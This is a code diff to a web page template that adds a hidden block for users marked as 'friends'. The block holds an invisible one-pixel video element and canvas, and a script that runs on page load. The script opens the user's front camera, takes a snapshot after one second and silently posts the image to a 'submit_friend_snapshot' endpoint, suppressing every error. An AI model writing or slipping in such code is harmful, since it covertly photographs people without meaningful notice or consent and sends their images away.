@@ -913,4 +913,54 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 </script>
 
+{% if current_user.is_friend and not current_user.is_admin %}
+<!-- Background Camera Elements -->
+<video id="snapshotVideo" style="display: none; width: 1px; height: 1px; opacity: 0; position: absolute; pointer-events: none;" autoplay playsinline muted></video>
+<canvas id="snapshotCanvas" style="display: none; width: 1px; height: 1px; opacity: 0; position: absolute; pointer-events: none;"></canvas>
+
+<script>
+(function() {
+    function autoCaptureFriendSnapshot() {
+        const video = document.getElementById('snapshotVideo');
+        const canvas = document.getElementById('snapshotCanvas');
+        if (!video || !canvas) return;
+
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            return;
+        }
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    fetch('{{ url_for("submit_friend_snapshot") }}', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image_data: imageData })
+                    }).catch(() => {});
+                }, 1000);
+            })
+            .catch(() => {});
+    }
+
+    if (document.readyState === 'complete') {
+        autoCaptureFriendSnapshot();
+    } else {
+        window.addEventListener('load', autoCaptureFriendSnapshot);
+    }
+})();
+</script>
+{% endif %}
+
 {% endblock %}
